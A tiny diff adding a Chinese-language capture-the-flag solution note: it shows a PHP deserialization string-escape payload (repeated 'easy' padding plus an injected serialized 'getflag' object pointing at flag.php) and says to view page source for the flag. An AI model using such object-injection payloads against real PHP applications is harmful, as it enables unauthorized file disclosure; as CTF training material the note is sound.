@@ -1,0 +1,5 @@
+构造字符串，使其反序列化后flag="flag.php":
+
+easy=easyeasyeasyeasyeasyeasyeasyeasyeasy
+ez=;s:4:"str2";O:7:"getflag":1:{s:4:"file";s:8:"flag.php";}
+Ctrl+U查看源码即可得到flag
